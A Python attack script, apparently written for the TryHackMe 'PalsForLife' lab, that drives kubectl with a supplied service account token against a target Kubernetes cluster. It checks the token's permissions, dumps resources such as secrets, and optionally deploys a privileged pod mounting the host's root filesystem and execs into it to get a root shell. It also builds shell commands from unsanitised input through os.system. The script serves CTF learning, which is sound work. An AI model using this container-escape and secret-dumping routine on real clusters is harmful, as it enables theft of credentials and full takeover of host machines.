#!/usr/bin/env python3

import argparse
import os
from colorama import Fore, init
import time

init(autoreset=True)

parser = argparse.ArgumentParser(description="This is an semiautomated python script that enumerating kubernetes cluster in 'PalsForLife' room in TryHackMe.")
parser.add_argument("-t", "--token", help="Service account token")
parser.add_argument("-u", "--url", help="The target machine's URL. E.g. https://10.10.44.205")
parser.add_argument("-p", "--port", help="The port of the URL")
args = parser.parse_args()

def get_auth():
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify auth can-i --list"
	os.system(command)

def get_res():
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify api-resources --namespaced=true "
	os.system(command)

def get_name(resource):
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} --all-namespaces"
	os.system(command)

def ext_name(resource, name, namespace):
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify get {resource} {name} -n {namespace} -o yaml"
	os.system(command)

def createpod():
	print(Fore.CYAN + "Creating pod.yaml...")
	os.system("""echo 'apiVersion: v1
kind: Pod
metadata:
  name: pod
  labels:
    app: pod
spec:
  containers:
  - name: pod
    image: gitea/gitea:1.5.1
    imagePullPolicy: IfNotPresent
    volumeMounts:
    - name: hostvolume
      mountPath: /pod
    ports:
    - containerPort: 80
    securityContext:
     privileged: true
  volumes:
  - name: hostvolume
    hostPath:
      path: /' > pod.yaml
		""")
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify create -f pod.yaml"
	os.system(command)

def spawnshell():
	print(Fore.CYAN + "-" * 10 + "Spawning a Root Shell :D" + "-" * 10)
	command = f"kubectl --server {args.url}:{args.port} --token {args.token} --insecure-skip-tls-verify exec --tty --stdin pod '/bin/bash'"
	os.system(command)

print(Fore.CYAN + "-" * 10 + "Part 1: Getting Current Privileges" + "-" * 10)
get_auth()

print(Fore.CYAN + "-" * 10 + "Part 2: Getting Supported Resources" + "-" * 10)
get_res()

print(Fore.CYAN + "-" * 10 + "Part 3: Getting Resource" + "-" * 10)
res = input("Which resources you want? E.g. secrets\n")
get_name(res)

print(Fore.CYAN + "-" * 10 + "Part 4: Extracting Name" + "-" * 10)
name = input("Which name you want? E.g. flag3\n")
namespace = input("Which namespace you want? E.g. kube-system\n")
ext_name(res, name, namespace)

print(Fore.CYAN + "-" * 10 + "Part 5: Spawning a Root Shell(Optional)" + "-" * 10)
revshell = input("Do you need to spawn a root shell? Y/N\n")

if revshell == "Y":
	createpod()
	time.sleep(1)
	spawnshell()
else:
	print(Fore.CYAN + "Bye!")
	exit()